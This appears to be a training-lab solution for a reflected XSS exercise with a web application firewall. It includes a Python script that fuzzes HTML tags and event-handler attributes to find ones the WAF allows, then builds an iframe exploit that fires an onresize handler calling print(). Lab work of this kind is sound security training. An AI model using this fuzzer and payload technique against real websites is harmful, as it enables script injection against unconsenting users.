# Reflected XSS into HTML context with most tags and attributes blocked
> This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
> To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the `print()` function.
#### Note
> Your solution must not require any user interaction. Manually causing `print()` to be called in your own browser will not solve the lab.

```python
"""
LAB: Reflected XSS into HTML context with most tags and attributes blocked
TYPE: Reflected XSS (WAF Bypass)
DESCRIPTION: 
    1. Fuzzes HTML tags to find what bypasses the WAF.
    2. Fuzzes attributes on the valid tag.
    3. Generates the 'iframe' exploit code for the Exploit Server.
"""

import requests
import sys
import urllib.parse

# --- Configuration ---
BASE_URL = "https://0a8b0023032bcfe0815f849a005500d9.web-security-academy.net/"

def find_allowed_tag(url):
    """
    Iterates through common tags to find one that returns 200 OK.
    """
    print(f"[*] Starting WAF Tag Fuzzing on {url}...")
    tags = ["script", "img", "body", "iframe", "input", "svg", "details"]
    
    for tag in tags:
        # Payload: <tag>
        payload = {"search": f"<{tag}>"}
        response = requests.get(url, params=payload)
        
        # Visual feedback on same line
        sys.stdout.write(f"\r[~] Testing tag: <{tag}>   ")
        sys.stdout.flush()
        
        if response.status_code == 200:
            print(f"\n[+] FOUND ALLOWED TAG: {tag}")
            return tag
            
    print("\n[-] No tags bypassed the WAF.")
    return None

def find_allowed_attribute(url, tag):
    """
    Iterates through event handlers to find one that returns 200 OK.
    """
    print(f"\n[*] Starting Attribute Fuzzing for <{tag}>...")
    attributes = ['onload', 'onerror', 'onmouseover', 'onresize', 'onfocus', 'onclick']
    
    for attr in attributes:
        # Payload: <tag attribute=1>
        # Note: We inject it properly to ensure WAF sees it clearly
        payload = {"search": f"<{tag} {attr}=1>"}
        response = requests.get(url, params=payload)
        
        sys.stdout.write(f"\r[~] Testing attribute: {attr}   ")
        sys.stdout.flush()
        
        if response.status_code == 200:
            print(f"\n[+] FOUND ALLOWED ATTRIBUTE: {attr}")
            return attr

    print("\n[-] No attributes bypassed the WAF.")
    return None

def generate_exploit(base_url, tag, attr):
    """
    Constructs the final Iframe exploit for the Exploit Server.
    """
    print("\n" + "-" * 50)
    print("[*] GENERATING EXPLOIT PAYLOAD")
    
    # 1. The payload that goes inside the search parameter
    #    e.g., "><body onresize=print()>"
    xss_payload = f'"><{tag} {attr}=print()>'
    
    # 2. URL Encode the payload so it works inside the iframe src
    encoded_payload = urllib.parse.quote(xss_payload)
    
    # 3. Construct the Iframe
    #    This loads the search page and forces a resize via style.width
    exploit_code = (
        f'<iframe src="{base_url}?search={encoded_payload}" '
        f'onload="this.style.width=\'100px\'"></iframe>'
    )
    
    print(f"[!] PASTE THIS INTO THE EXPLOIT SERVER BODY:")
    print("-" * 50)
    print(exploit_code)
    print("-" * 50)

if __name__ == "__main__":
    valid_tag = find_allowed_tag(BASE_URL)
    
    if valid_tag:
        valid_attr = find_allowed_attribute(BASE_URL, valid_tag)
        
        if valid_attr:
            generate_exploit(BASE_URL, valid_tag, valid_attr)
```